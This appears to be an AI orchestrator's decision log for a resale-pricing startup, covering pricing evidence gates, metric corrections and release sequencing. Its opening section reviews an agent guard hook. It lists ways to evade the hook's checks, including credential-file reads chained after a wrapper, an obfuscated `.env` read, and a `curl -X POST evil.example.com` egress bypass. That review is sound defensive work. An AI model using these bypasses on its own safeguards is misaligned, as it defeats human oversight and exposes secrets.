**`security-eng` gave the patch design.** The diagnosis, precisely: the check asks *"does the string
`with-secrets.sh` appear anywhere in the command?"* when it means *"is `with-secrets.sh` the program
being executed?"* Its design tokenises with `shlex` (whose default `commenters='#'` **structurally
eliminates** the comment trick rather than special-casing it), splits on top-level control operators,
resolves each segment's argv0 through `realpath`, and checks the credential token **per segment** —
so `<wrapper> true && cat <cred file>` blocks on segment 2 even though the wrapper appears earlier.
It bails out **fail-closed** on `$(...)`, backticks and heredocs, because shlex *silently mis-splits*
those rather than erroring, and a mangled parse is worse than a refusal.

**Its honest ceiling, stated rather than assumed away:** no text tokenizer catches
`python3 -c "open('.'+'env').read()"` — the substring never appears, so the pre-filter never fires.
*"That's not a defect in this design, it's a ceiling on what a Bash-command-line hook can ever
guarantee."* Which is `tech-lead`'s referent/string point arriving independently.

**It also found four more same-class defects while it was in there** (flagged as candidates, read not
tested): `rm --recursive --force` evades the short-flag regex; `curl -d'{...}'` with no space evades
the Stripe-write verb check; `DELETE FROM anywhere_cache` reads as having a WHERE clause because
*where* is a substring of *anywhere*; and a schemeless `curl -X POST evil.example.com` extracts zero
hosts so the egress allowlist loop never runs.

**`devops` answered the question `security-eng` had to leave open, and it is the one that mattered.**
*Nothing scheduled runs through Claude Code hooks at all.* Both launchd jobs are launchd → bash →
python with no `claude` anywhere in the chain; it grepped the whole call path for `claude` and got
zero hits. **So the "will this break the only working unattended job" risk is zero, proven by the
plists rather than assumed.** That was my blocking concern.

**It also corrected a precedent I had relied on.** I cited `~/work/.claude/agents` as evidence
symlinks survive a move. It is an **absolute** symlink created *fresh after* the move — it proves
nothing either way. Its actual argument for relative symlinks is better: the Desktop→work move
preserved the *sibling* layout, so `../../../resale-iq/.claude/hooks/guard.py` would have needed zero
edits, whereas absolute references mean three-plus places to remember next time.

**And it found the real 3am failure mode:** `DEPLOY_APPROVED` is computed from `ROOT`, and **one
shared token already gates both repos' deploys** — used for real on 2026-08-31, both pushes logged
under one founder note. If a *copy* of guard.py ever had `ROOT` rewritten, the gate would silently
split: founder approves once, backend ships, frontend still says BLOCKED, nobody notices.

**RESOLUTION — absolute-path reference in each `settings.json`, no copies, no symlink.**
`tech-lead` and `security-eng` both land here; `devops` dissents toward relative symlinks. The
deciding point is that **none of the three proposes copying the file**, so the `DEPLOY_APPROVED`
split cannot occur under any of them — which removes `devops`'s strongest argument for symlinks. On
what remains, a path visible in the settings diff beats a filesystem object that can be replaced by
a real file during an edit. **`devops`'s move-resistance point is real and is recorded as the cost:**
the next move edits N settings files instead of one symlink target.

**One `devops` claim I checked rather than propagated:** it suspected `activity.py` still carried the
old `~/Desktop` ROOT. **It does not** — both hooks read `/Users/bilalsbaiby/work/resale-iq`. The only
Desktop remnants are in `SCOPE`, which is A9.

**Agreed order:** (1) the secret-check fix, re-reviewed, *before* rolling anything out — no sense
distributing flawed matching logic and patching it twice. (2) growth and seo next, lowest blast
radius. (3) demand-intel **last and additively** — append to its `PreToolUse` array, never replace
it, since its existing entries include a memory-dir bootstrap other tooling may depend on.


---

### The retroactive §0.7 review — done. 12 artefacts, 7 sound, 3 needs-work, **0 must-not-ship.**

`tech-lead`, on `f634592`. It stated its own depth honestly ("I did **not** read `scripts/canary/*.py`
line by line — flagging that as a gap in this review, not a pass"), which is the right posture for a
review that is itself remediation.

**It resolved the contradiction with git rather than prose: `monetization` was right.** The
anon-quota fix (`96f8fec`) **is** an ancestor of `origin/main`, merged 22:58, live in production.
`ux-researcher` made *"merge `anon-quota-cookie`"* its **#1 P0 against already-merged code**.

**The root cause matters more than the correction, and it is mine.** `ux-researcher` inferred merge
status from **documentation** — `SESSION.md`, and `dashboard/data.json`'s branch list. That is
derived state read as source state, OS §0 rule 3, in an artefact whose own opening line is *"main is
what a real visitor gets today."* It had the right principle and consulted the wrong instrument,
**and I built the wrong instrument**: `build_dashboard.py` enumerated branch refs without checking
merge status, so a merged branch whose ref still existed read as outstanding work. **Fixed** — the
panel now marks `(merged)`, and `demand-intel:anon-quota-cookie  (merged)` is what it says today.

**Two stale numbers propagated across artefacts, and both are about to move again:**

- [ ] **The 19% `LIMIT_REACHED` figure is measured on a window ending at the moment the fix merged.**
      It is a true measurement of a bug that no longer exists. It drove `FUNNEL-WALK.md`'s break #1,
      `DESIGN-REVIEW.md`'s state ranking #4, and the Playwright workflow header. **Re-measure on a
      post-`96f8fec` window before anything is prioritised from it.**
- [ ] **The 40.9% was misattributed by 3 of 6 artefacts.** `insufficient_data_rate.sql` counts
      `verdict IN ('INSUFFICIENT_DATA', 'UNKNOWN')` — the **union of two different refusals**.
      `customer-success`, `product-manager` and `extension-eng` cited it correctly; `ux-researcher`,
      `designer` and `qa-eng` attributed all of it to `INSUFFICIENT_DATA` alone. The
      `INSUFFICIENT_DATA`-only share is **UNKNOWN and ≤ 40.9%**; nobody has run the segmented query.
      **The three that got it wrong are the three building UI, tests and design priorities on it.**
- [ ] **A8 consequence:** C5 routes *more* traffic to `INSUFFICIENT_DATA`, so every 40.9% in that
      commit goes stale on merge. Six downstream consumers — an argument for writing the
      discontinuity marker **before** C5 lands, not after.
- [ ] **Consider renaming `insufficient_data_rate` → `refusal_rate`** in the A8 gate. A name that
      denotes one of the two things it counts is what invited three independent misreadings.

**`qa-eng` — needs-work, and it is the artefact that actually executes.** `e2e/mock-backend.mjs`
fabricates a response shape the backend never emits: there are **two** distinct `INSUFFICIENT_DATA`
returns (`api/routes.py:892-911` and `:1046-1063`) and the fixture wears the first one's strings with
the second one's `data_quality` plan-gating, while omitting `match_note` which the real path returns.
So the spec for **the most-seen non-answer in the product** validates the frontend against a payload
the server does not send. The leak assertions are unaffected — both paths redact for anon — so this
is a fidelity defect, not a false green on the paywall.

**`data-eng` canary — sound, with a caveat that would have become a false HIT.** The single logged
run was frozen at 00:18:21 and run at 00:22:17, four minutes later, with an identical
`model_signals_max_updated_at` in both fingerprints. **`60/60 UNCHANGED` was arithmetically
guaranteed.** The mechanism is proven; the run proves nothing about drift.
- [ ] **Label it a mechanism smoke run and exclude it from the 7-day strip.** OS §3 scores
      `canary green 7/7 days`; counting this as day 1 would be a HIT built on a vacuous observation.
      The file's own honesty makes this recoverable — but the honesty sits in `cannot_conclude`, a
      field the scorer does not read.

**Bookkeeping against my own commit message:** it credited twelve agents. **Ten artefacts are in that
diff** — `finance-ops` was flagged as an earlier commit, `seo`'s brief lives in another repo and was
not.

**The meta-finding, which is the one worth keeping:**

> *"Agents reading company documentation as if it were the machine. `ux-researcher` read `SESSION.md`
> for merge status; three agents read `METRICS.md`'s headline for a metric definition without opening
> the `.sql`. Neither is carelessness. Both are what happens when the constitution says 'not proven on
> disk is not done' and the fastest thing on disk is a summary."*


---

### A8 — **BUILT AND SHIPPED**, 2026-09-01 (`5984617`, `828ac8d`)

| Decision | What shipped |
|---|---|
| **A8-1 strike MAPE** | Struck in `METRICS.md`. Nothing orphaned — it never had a `.sql` and never produced a reading |
| **the counter it exposed** | `band_evidence_p50` — median `comparable_n` behind a printed band. Recorded here as the counter that moves the **right** way for the honest fix (12→26) and **wrong** for the dishonest one (12→10); **retracted 2026-09-01**: re-measured against production, the honest fix (A13) reads **12→13** on this definition and **14→12 (falls)** supply-weighted — `band_evidence_p50` in fact moves the wrong way under an honest widening and must NOT be registered as A13's counter (see A13 entry below and `docs/company/RELEASE-A13-GATE.md`) |
| **A8-2 the split** | `band_coverage` → **`band_coverage_demand`**; the n-floor added to the **contract**, every file, each declaring its own with a rationale |
| **A8-3 the North Star** | **Neither** "upper bound" **nor** "exact count". The file now says `n ≥ 8` is *inferred* — the only true statement |
| **series breaks** | Both recorded, per `verifier`. The floor entry is the subtle one: no value moved, only which metrics are *allowed* to be shown |

**Production, after the floor:** `trial_to_paid` (n=1), `retention_30d` (n=0) and
`band_coverage_demand` (n=44) are now **withheld** — the outcome I originally wanted by fiat, reached
by a rule that applies to every file and restores itself when traffic is real.

**Left deliberately OPEN rather than taken under this authorisation:**

- [ ] **Rename `insufficient_data_rate` → `refusal_rate`.** It counts the UNION of a corpus problem
      and a matcher problem, and three of six agents misread it as one. A definition change belongs
      to you, not to an authorisation granted for three other things.
- [ ] **Persist `comparable_n` on `verdict_logs`** + the regression test
      `said_buy_below IS NOT NULL ⟹ comparable_n >= 8`. One column, and it closes A8-3 properly
      instead of documenting the inference.
- [ ] **Log post-gate, or exclude locked deliveries from the North Star** — `tech-lead`'s
      delivered-vs-computed finding. A third A8 question nobody had asked.
- [ ] **The probe-traffic filter**, before any demand-side metric is cited again.

**Next in sequence: A13** — definitions were required to land first, and now have.


---

### A13 — **BUILT**, awaiting joint review (`eba6021`, branch `claude/data-scientist/a13-comparable-window`)

One token at `db/queries.py:1986`. The 7d/30d window choice was gated on `MIN_COMPARABLES` (3, the
**admission** floor) where it meant `MIN_VERDICT_COMPARABLES` (8, the floor to **print a price**), so
`prices_30d` was built thirty lines earlier and discarded for any model that found 3 comps in a week.

| | before | after |
|---|---:|---:|
| supply coverage | 43.0 % | **62.0 %** |
| demand coverage (n=180) | 62.8 % | **81.1 %** |
| median evidence behind a printed band | 12 | **13** (corrected 2026-09-01; was recorded as 26, does not reproduce — see `docs/company/RELEASE-A13-GATE.md`) |

Tests: 8 cases, negative control passes. Full suite 1167. **Branched off `main`, not off the
data-defects branch, so each stays independently revertible.**

**Sent to `tech-lead` for a JOINT review with the C6 rework**, per `product-manager`: both touch "how
many comparables justify a band" and nobody has confirmed they do not compound. The specific thing I
asked it to hunt for is whether A13 moves **prices** and not merely evidence counts — switching a
model from the 7d to the 30d window changes `avg_price_eur` and `max_buy_price` too, and a quiet
price shift hiding inside a coverage fix is the shape of thing it caught last time.

**Deferred with reasons, not forgotten:**
- The **14-day** window `data-scientist` preferred. Today every window ≥ 14d returns identical rows —
  `sold_observed = 1` begins 2026-08-21, so the corpus is 11 days deep. Adding a third bucket is
  unmeasured surface for a difference that does not yet exist.
- **A calendar control is required on any goal registered against coverage.** It drifts upward on its
  own until ~2026-09-20 as the corpus fills, with or without this change. Already visible tonight:
  `band_coverage_supply` read 43.0 % and then 40.0 % hours apart.


---

### C8 — the measurement that cannot be taken, and why that is the finding

`backend-eng`, 2026-09-01. **Verdict: real, live, and not neutralised.** Full write-up in
`docs/audit/C8-BRAND-DROP.md`.

**The sharpest thing it found is that my proposed measurement was worthless.** I asked it to count
`sold_observed = 1` rows whose `brand` is empty. That query reads **exactly 0 in production, by
construction, regardless of the true contamination rate** — because a row with a blank `brand_title`
can never be upserted in the first place. It is a **false-negative generator**, not evidence of
safety. Had it run that query and reported 0, the honest-looking conclusion would have been the
opposite of the truth.

**On the crux I asked it to refute:** `engine/shelf.py`'s two-strike mechanism only defends against a
**transient** single-pass miss — reappearance unconditionally clears the strike. `brand_title` is
seller-set catalog metadata, not per-request noise, so a listing that reads blank once very plausibly
reads blank every pass. The comforting "0.58% squared" decay assumes independent draws per fetch; it
is the same fact recurring, so real exposure is close to the full per-pass rate.

- [ ] **Fix: keep the row, null the field** — the same shape as the C6 second pass. **Not implemented
      yet, deliberately:** it touches `parse_item`, which `tech-lead` is reviewing on
      `fx-currency-v2` right now. Editing the same function on a second branch mid-review buys a
      merge conflict and a confused reviewer for no gain.

**One thing it declined to do, correctly:** it killed a query mid-run — an unindexed full scan over
12.68M rows against the live-serving database file. The legacy still-active population is left
**UNKNOWN**, with the index that would make it safe written down. A number is not worth a production
stall.


---

### The joint review came back — FX v2 **APPROVED**, A13 **REQUEST CHANGES**

`tech-lead`, 2026-09-01. It traced the data flow end to end rather than reading diffs, "because the
joint question can only be answered downstream of `model_signals`."

**Q1 — do C5 and A13 compound? NO, and it verified the invariant rather than asserting it.** They act
on **disjoint populations**: C5 changed behaviour only where `comparable_n` is *missing*; A13 acts only
where it is *present and 3-7*. No row is in both, so there is no multiplicative term. It then checked
the real risk — that A13 edits the code which *writes* `comparable_n`, on which C5's "100/100 rows"
justification rests — and confirmed the if/elif/else is exhaustive, so **the 100/100 invariant
survives A13.**

**Q2 — my instinct was right, and worse than I guessed. A13 MOVES PUBLISHED PRICES.**

`publishable_opportunity()` gates on the *presence* of `avg_price_eur` and `max_buy_price` — **no
`comparable_n` check.** And `api/resale_routes.py` contains **zero** matches for `comparable_n`,
`verdict_allows_buy_below` or `MIN_VERDICT`. So Deal Finder, the watchlist, the brand/model pages,
the opportunities queries and the `&price_to=` sourcing-link param all read `max_buy_price`
**directly, with no n ≥ 8 gate.**

Those ~19 crossing models were **already publishing a buy-below** on four paid surfaces, computed
from the 7-day sample. After A13 they publish one computed from the 30-day sample. **A real
before/after numeric delta, to users already being shown a price, unquantified.**

> *"`api/routes.py:889` being 'the only thing actually enforcing 8' is the correct observation. Its
> consequence is the opposite of reassuring: it means A13's price shift is invisible to the one
> surface that has a gate, and fully live on the four that do not."*

- [ ] **Merge condition: report `max_buy_price` before/after for the crossing models** — n, median
      absolute delta, median percent, worst case. Read-only, and `price_stats_map` already computes
      both sides. ~2% is a footnote; 15% is a repricing that belongs in a release note.
- [ ] **A13 also moves the CONFIDENCE BAND.** `api/routes.py:570-575` bands on `comparable_n`
      (≥30 HIGH, ≥10 MEDIUM). The median crossing HIGH was previously stated as "12→26"; that figure
      does not reproduce (corrected 2026-09-01: the median demand-weighted reading is 12→13, and it
      falls supply-weighted, 14→12 — see A13 entry above). Some individual models still cross into
      HIGH on their own `comparable_n` (a per-model fact, not a median fact) — Defensible, more
      evidence genuinely is higher confidence for those models — but it must be *stated per-model*,
      not claimed via the retracted median.
- [ ] **A dated tripwire for 14d-vs-30d, not a note.** The measured 43→62 % holds only while
      `30d == all available data`. Around **2026-09-19** the 30-day window starts genuinely excluding
      comps and the gain partially unwinds. *"That is the definition of banking a stale default."*

**Q4 — an over-claim of mine, now corrected in code (`6e2db92`).** I wrote that an unpriceable row is
"KEPT with `price_eur = NULL`". `upsert_listing` (`db/queries.py:133`) **rejects** a falsy
`price_eur`, so such a row never exists in `listings`. The blocker is still genuinely closed — `shelf`
is built from `parse_item`'s return *before* the upsert loop — but the honest sentence is **"present
to the shelf, absent from the table"**, and that asymmetry is the fix rather than a side effect.

**And the closing observation, which is bigger than either branch:**

> *"'The n ≥ 8 gate' is a property of ONE endpoint that the company has been discussing as a property
> of the product, and the North Star SQL inherits the same assumption."*

- [ ] **New GAPS row owed:** four paid surfaces publish `max_buy_price` with **no evidence floor at
      all**. Every conversation tonight about coverage, the North Star and honesty has been about
      `/api/verdict`. The product is wider than the gate.


---

### AM-7 roster consult — **gate the ungated paid surfaces.** Two verdicts in, converging.

**`product-manager`: gate it tonight, TRUE pile, top priority — and not close.**

> *"An honest refusal costs you a conversion; a wrong number costs you a customer, and we have
> already watched that happen once."*

It identified this as **the same bug shape as C5, one call site over**: C5 was `comparable_n` absent →
assume the gate passed, on `/api/verdict`. Here the gate was **never wired at all**, on the **paid**
surfaces. `STANDARDS.md` §0 already names the family — *"a default value in a lookup is a decision."*

The distinction that decides it: the funnel bugs being fixed in parallel cost a **visitor** who never
converts — bad, recoverable, they can come back. This costs a **customer** who paid €49, acted, and
lost money. *"It converts and then breaks, rather than failing to convert at all."* That is the
mechanism behind the one refund this company has ever had.

**`monetization`: gate means RELABEL, not delete the row.** Verified the claim itself
(`grep -c` for the evidence-gate functions in `resale_routes.py` → **0**) rather than taking it from
me. Keep the row, the model and its `n`; withhold or flag only the price. `engine/sufficiency.py`'s
existing `WITHHELD` mechanism **already names `max_buy_price`**, so this is reuse, not new work.

**Both independently say: gate BEFORE or WITH A13**, because A13 alone swaps one under-evidenced
price for a different under-evidenced price on those same 18 models.

**The converged design — three tiers, not binary**, reusing the four extension panel states that
already exist:

| `comparable_n` | behaviour |
|---|---|
| ≥ 8 | full band |
| 3–7 | **price still shows, labelled low-confidence with its `n`** |
| < 3 | honest refusal |

Plus: **sort Deal Finder and opportunities by confidence tier**, so a paying customer's first screen
is the trustworthy subset and the weaker rows sit below it, marked — rather than mixed in
indistinguishably as they are today.

That answers my worry that gating guts the paid product: it does not go blank on 57% of the board.
**One gate function extended to more call sites, one existing label set reused, one sort key added.**

**On the ten-customer goal, `product-manager` gave the uncomfortable version I asked for:**

> *"Selling ten hard 'trust this price' commitments into this risks not ten customers but ten repeats
> of the one refund we have already had."*

Its recommendation is to **reframe rather than cancel**: ship the gate, then sell the first ten as
**founding / early-access** with the calibration state told straight — *"pricing confidence shown per
item, still being calibrated."* Once the tiers ship, honesty about confidence becomes the pitch
rather than the liability. **The founder's call, made with the cost named.**

**Time-critical, already actioned:** `product-manager` warned that `designer` and `frontend-eng` —
both mid-build right now — must not bake a live buy-below figure into the landing page or into test
expectations, or the rebuilt page ships wrong on launch night. Both were messaged mid-task.


#### `customer-success` and `legal-compliance` — they SPLIT the converged design, and they are right

`product-manager` proposed three tiers with **3–7 shown as low-confidence**. Both of the roles closest
to the user rejected that band.

**`customer-success`:** below `n = 8` there is no honest "less certain" version to show — **only a
refusal.** The disclosed middle band belongs at **8 ≤ n < 30** (the MEDIUM state, whose copy and
colour token are already shipped in `design/extension-panel/low-confidence.html` and were simply
never adopted by the paid surfaces). It also found the same brand+model gets an **honest refusal on
the free surface and a full-strength number on the paid one** — which is the worst possible
arrangement of the two.

**And it identified one place where copy cannot be the answer at all:** the `&price_to=` sourcing
link. `build_sourcing_links` (`resale_routes.py:202-227`) bakes `max_buy_price` into a live Vinted
URL. **No disclosure sentence travels with a query parameter** — the moment it is clicked it is a
hard filter on an external site. That is an engineering gate, not a wording problem: **do not emit
the param below the floor.**

**`legal-compliance` made the same call from the other end, and went further than I expected:**

> *Matched disclosure can mitigate. **Thin disclosure chosen because it is cheaper than calling the
> already-existing, already-fail-closed `verdict_allows_buy_below()` is not a defence — it can read
> as evidence of knowledge, which is worse than silence** under UCPD's "knew or should have known".*

Paying **strengthens** the exposure: it is a direct transactional decision under Art. 6, plus a
separate breach-of-bargain theory, because `/methodology` describes exactly the confidence standard
the code does not apply. A footer-linked page does not meet Art. 7's "clear, timely, at the point of
decision" bar for a number rendered live in Deal Finder.

**And it re-ranked its own earlier finding when asked the sharper question.** Its GDPR gap is worse
for *total harm over time*; **this is worse for what must close before ten strangers pay tonight** —
live on minute one of a new subscription, it breaks the promise actually sold, and the fix already
exists and works on a sibling surface.

**One thing it refused to do, correctly:** it could not verify the production figures relayed to it
(no DB access) and reported them **as relayed, not confirmed**, while independently verifying every
code claim by grep.

---

### THE ROSTER DECISION — gate at `n ≥ 8`, refuse below it, never emit `price_to` under the floor

Four consultations, converged with one amendment to my own summary:

| `comparable_n` | behaviour |
|---|---|
| ≥ 30 | full band, HIGH confidence |
| 8–29 | price shown, **MEDIUM** — reuse the shipped low-confidence copy and token |
| **< 8** | **honest refusal. No number, on any surface.** |
| any `n < 8` | **`&price_to=` must not be emitted at all** |

Plus: sort Deal Finder and opportunities by confidence tier, so the trustworthy subset is the first
screen.

**Sequencing, unanimous: gate BEFORE or WITH A13.** A13 alone swaps one under-evidenced price for a
different under-evidenced price on the same 18 models.

- [ ] **Implementation is `backend-eng`'s**, reviewed by `tech-lead`. One already-built function
      extended to more call sites, one already-shipped label set adopted, one sort key.


---

### A15 — two branches fixed the same defect. **My coordination error, not theirs.**

I briefed `frontend-eng` to fix the three conversion moments and `designer` to rebuild the landing
page, and both scopes contained `LIMIT_REACHED`. They worked in separate worktrees so nothing
collided at write time, and both did good work. **They will conflict at merge.**

| | `claude/frontend-eng/conversion-moments` (`fea3221`) | `claude/designer/landing-truth` (`1fa24d3`) |
|---|---|---|
| verification | **VERIFIED** — tsc, build, 5 check scripts, **24/24 e2e**, eslint, own `proof.sh` | **UNVERIFIED** — the agent had no shell and said so |
| overlap | `free-checker.tsx`, `verdict/page.tsx`, `extension/content.css` | same three |
| unique | `extension/background.js`, `content.js`, `proof.sh` | `page.tsx`, `i18n.ts`, `extension-hero.tsx`, `design/*` |

**Resolution, for `tech-lead` rather than for me at 4am:** take `frontend-eng` as the base for the
three overlapping files — it is the verified one — then port `designer`'s distinct contributions into
them, which are additive rather than competing:

- the **token fix** (`WATCH` and `LIMIT_REACHED` no longer share a colour — a verdict and a quota
  wall must not look alike),
- the **placeholder change** (`Levi's 501` → `New Balance 530`, per `ux-researcher`: the catalogue is
  sneaker/streetwear and the old example gestured at general vintage it cannot serve),
- the **"try one of these instead" chip row** on `UNKNOWN`.

`designer`'s six non-overlapping files apply cleanly and are not in dispute.

**I am not doing this merge myself.** Reconciling two half-verified branches by hand, at this hour,
having already made two over-claims tonight, is how the third one happens.

- [ ] `tech-lead` reconciles, then the combined branch is re-verified end to end before merge.

**And a process note worth more than the fix:** the failure was in the briefs, not the work. Two
agents were given overlapping surfaces because I wrote the second brief without re-reading the first.
`isolation: worktree` prevented them from corrupting each other's files — which is exactly what it is
for — but **nothing prevented them from solving the same problem twice.** Worktrees protect the tree;
they do not protect the plan.


#### `product-manager` exercises right of reply — **retracts the 3–7 band, and corrects my arithmetic**

Given the reply it was owed under AM-8a, it retracted rather than defended, **and supplied the
argument that actually settles it** — one neither `customer-success` nor `legal-compliance` made:

> **"Jordan 1 Low moved −39% between two samples of n=3. My 3–7 proposal treated that band as 'real
> data, just less certain'. A number that swings 39% between two draws of the same population is not
> a weaker signal, it is noise with a badge on it. A low-confidence label implies we have a weaker
> version of the answer; at n=3–7 we do not have an answer, stable or otherwise. Labelling does not
> fix instability — only sample size does."**

That evidence was in the original finding and nobody weighed it, including me. **The strongest
argument for the 8-floor came from the agent being overruled**, which is the whole case for having
put the objection back to it.

**And it corrected a number I have repeated all night.** The *"the gate blanks ~57% of the board"*
figure is **pre-A13** — derived from supply coverage at 43%. A13 lifts that to 62%, so the honest
cost is nearer **38%**. I briefed `designer` and others to scope around 57%. Cross-tab requested from
`data-scientist`; **nobody should design against 57% until it comes back.**

**A sequencing inversion falls out:** if the models A13 lifts are largely the ones the gate would
otherwise silence, **A13 cushions the gate and the two belong in ONE release** — not gate-then-A13 as
the roster agreed earlier. Contingent on the cross-tab.

**What it did NOT retract, rightly:** the paid surface going thin is a real problem that does not
disappear because the fix that would have papered over it was wrong.

**Its answer — redefine the tier, do not reprice it**, which is exactly where `monetization` landed
independently:

| band | what Pro promises |
|---|---|
| `n ≥ 30` (HIGH) | the **only** band driving an actionable buy-below and the sourcing link |
| `8 ≤ n < 30` (MEDIUM) | a real number as **market context, not a recommendation** — and **never wired into `build_sourcing_links`**, since a URL cannot carry a caveat once clicked |
| `n < 8` | refusal |

Plus **surface coverage in-product as a trust signal** — "X of Y tracked models have high-confidence
pricing today" — rather than letting customers discover it after paying. And **reposition Pro from
"comprehensive AI pricing" to "bulk tools and alerting on the confidently-priced subset, plus raw
market data on the rest."** Asking-price-at-disappearance is honest value; a purchase recommendation
on it is not.

**Starter €19 is unaffected and is the safer product to push tonight** — the same conclusion
`chief-of-staff` reached independently.


#### `data-scientist` re-measures — **and the tier design is not viable as stated**

**1. The metric is not merely stale, it is UNSTABLE.** Its own pinned control failed:

> **`band_coverage_supply` moved 43.0 % → 40.0 % in under two hours with no code change.** Nothing
> shipped. The analyzer rebuilt the board and three models fell out of the priced set.

Brief it as **"~37 %, ±3 pp of rebuild noise, measured 2026-09-01, drifting until ~2026-09-20"** —
never as a fixed property.

**2. The gate's cost, both arms on the same snapshot:** today **63 %** of the board goes blank;
post-A13, **37 %**. My "57 %" was wrong and `product-manager`'s "~38 %" was right. **A13 cushions
41 % of the gate's cost** (26 of the 63 silenced models are lifted back).

**3. It withdrew its own sequencing, for a stronger reason than cushioning.** It had said "gate
first, or in the same PR." It now says **one release only**:

> Every one of the 18 ungated models whose price moves under A13 **stays below 8 and is therefore
> gated by the combined release.** Shipping together means those prices never publish their swing on
> a paid surface at all — they go dark instead. **Gating first and A13 second reaches the same
> endpoint through a worse intermediate state**, publishing the +160 % `Levi's Trucker` move to
> paying users and then removing it.

**4. THE TIER DESIGN DOES NOT SURVIVE MEASUREMENT.** `product-manager` proposed that Pro promise a
recommendation only on HIGH (`n ≥ 30`). Counted:

| arm | HIGH `n ≥ 30` | MEDIUM `8–29` | hidden `< 8` |
|---|---:|---:|---:|
| models, today | 5 | 32 | 63 |
| models, post-A13 | **6** | 57 | 37 |
| **searches** (n=180), post-A13 | **22 (12.2 %)** | 124 | 11 |

**A13 does essentially nothing for HIGH — 5→6 models, 22→22 searches.** All of its lift lands in
MEDIUM. And the HIGH band is **16 of its 22 searches on a single model** (New Balance 530); three of
the six have ≤2 searches ever; four of six are luxury resale, not the sneakers the demand log is full
of.

> *"A €49 tier whose core promise reaches one in eight searches, concentrated in a single SKU, is a
> promise that will read as broken."*

**MEDIUM is where the product is** — 57 models, 124 searches, 68.9 % of the answered population. If
Pro's differentiator is a recommendation, **it has to fire on MEDIUM with its `n` visible.**

**5. `n ≥ 30` is not derived from anything.** Unlike 8 (`MIN_VERDICT_COMPARABLES`, anchored in the
North Star, `/methodology` and the four panel states), nothing depends on 30 yet — so it can
legitimately be chosen, but **against a stated statistical criterion, or it is threshold-shopping
wearing a tier name.** It offered to derive it from the drift-versus-`n` curve; requested.

**6. It withdrew its own proposed counter.** *"No model's `comparable_n` may decrease"* is
**unusable as a live monitor** — the 43→40 drift proves `comparable_n` decreases on its own between
rebuilds, so it would fire on ordinary analyzer runs. Valid only as a **proof-time** assertion on one
frozen snapshot. `MIN(comparable_n) = 8` survives, because it tracks the threshold rather than the
population.

**7. A governance-level finding, and the sharpest thing in the reply:**

> **Any counter threshold tighter than ±3 pp on a supply-side proportion will fire on rebuild noise
> alone. OS §7's "counter may not degrade > 2 pp" is INSIDE this metric's natural volatility.**

- [ ] **OS §7's 2 pp rule cannot be applied to supply-side proportions as written.** Either the rule
      takes a per-metric noise band, or the verifier will score MISSes the analyzer produced. Three or
      four readings across a day before freezing any baseline.


---

### A16 — **OPEN AM-8 VOTE: reposition from a pricing tool to a liquidity instrument?**

Founder, 2026-09-01: *"big changes are allowed if it have been consultant between sub agents and
reasonable."* So the decision I parked in `CLOSED-LOOP.md` as "not a 4am call" is on the table.

**THE QUESTION.** `tech-lead`, corroborated independently by `data-eng`: we observe an **asking
price** and a **disappearance from a shelf**, and infer a sale at that price. Both inferences bias
the absolute level in the same direction by an unmeasured amount. **Ordering and rates survive**
(errors are common-mode across models and largely cancel in a ranking); **absolute price levels do
not.** So momentum, sell-through and days-to-sell are defensible — and `max_buy_price`, the thing we
sell, is not.

> *"It would be closer to **we watch what actually moves.** That claim is fully supported by the data
> you have. The current claim is not."*

**THE CASE AGAINST, which I put to every agent rather than burying:** `ux-researcher` traced the
funnel and found **the paying moment IS the number.** `getTrialRecap` is the best worth-paying
artefact in the product, and the extension puts `buy_below` beside Vinted's Buy button at the moment
of decision. A reseller wants to know what to pay. **The repositioning may trade a claim we cannot
support for a claim nobody wants.**

**A third possibility nobody has argued yet, which I have put to the roster:** keep the number and
fix the *claim* — publish `buy_below` described as what it is, a threshold derived from **asking
prices at shelf departure**, not from sale prices. Honest relabelling rather than repositioning. Is
that sufficient, or a cosmetic dodge?

**And the measurement that pressures all three options:** the confident band is **6 models and 12.2 %
of searches, 16 of 22 on a single SKU.** If a recommendation is only defensible on HIGH, there is
barely a product — which is either an argument *for* liquidity, or evidence that **coverage is the
only real problem and neither pitch works until it improves.**

**Consulted:** `tech-lead` (origin), `ux-researcher` (holds the strongest objection), `monetization`
(can it be priced), `content-social` (can it be said). Votes pending; dissent recorded either way per
AM-8.

**Not decided by me.** This is the largest decision available to this company and I have been wrong
often enough tonight that my unaided judgement is not the right instrument for it.

---

### A17 — settled: the gate and A13 ship in ONE release

`data-scientist` withdrew its own "gate first, or with" recommendation. Reason: every one of the 18
ungated models whose price moves under A13 **stays below 8 and is gated by the combined release**, so
shipping together means those prices never publish their swing at all. **Gating first reaches the
same endpoint through a worse intermediate state** — it publishes the +160 % move to paying users and
then removes it. `backend-eng` notified mid-task; its implementation is unchanged.


#### A17 built — the evidence floor now reaches the paid surfaces (`bce6c47`)

`backend-eng`, branch `claude/backend-eng/gate-paid-surfaces`. **1179 tests pass**; I re-ran the two
new files independently — **31 pass** — rather than take the report on trust.

New `apply_verdict_evidence_gate()` **reuses** `verdict_allows_buy_below`, `verdict_comparable_n` and
`sufficiency.WITHHELD` instead of reimplementing any of them, which is what three agents asked for.
Wired into all five surfaces: Deal Finder, brand detail, trends, watchlist, KPIs. Deals now sort
`evidence_sufficient` first, so a paying customer's first screen is the trustworthy subset.

**`&price_to=` is guarded twice** — the value is gated at every call site *and* `build_sourcing_links`
re-checks the floor itself, so the param cannot escape even if a future caller forgets. That was the
one item marked non-negotiable, because no disclosure travels with a query parameter once clicked.

**Five decisions it flagged rather than made silently** — the right instinct, and one of them is a
genuine judgement call: a legacy row with **neither** `comparable_n` nor `n_fenced` keeps the existing
fail-open rather than being reported as a fabricated `n = 0`. That is defensible (inventing a zero
would be its own fabrication) and it is the one place the gate is still open. **Flagged for
`tech-lead`.**

**And it found an unrelated live bug without fixing it:** `get_kpis`'s `top_model_rows` never selects
`avg_price_eur`/`max_buy_price`, so `publishable_opportunity(top_model)` always evaluates False and
the "top signal" sublabel **is silently blank in production today.** Correctly left out of scope and
raised separately.


#### A16 — `tech-lead` votes **DO NOT REPOSITION**, and corrects its own brainstorm first

**It withdrew the sentence I was building the decision on.** I quoted its "the two errors are
common-mode and largely cancel in a ranking." Its correction:

> A seller who cannot sell an item **relists** it — which kills the old listing id and reads as a
> departure. So the **false-departure rate is negatively correlated with true velocity**: the least
> liquid items generate the most fabricated sales, because slow items are exactly the ones sellers
> refresh. **That is not common-mode error.** It compresses the ranking toward the middle and
> **inflates the apparent liquidity of precisely the items a reseller most needs warning about.**

The distinction that actually holds, and it is stronger:

> **The ordering error is measurable and correctable with data we already have** — build a labelled
> sample of 200 departures, hand-check how many were relists by searching the same title/photo hash
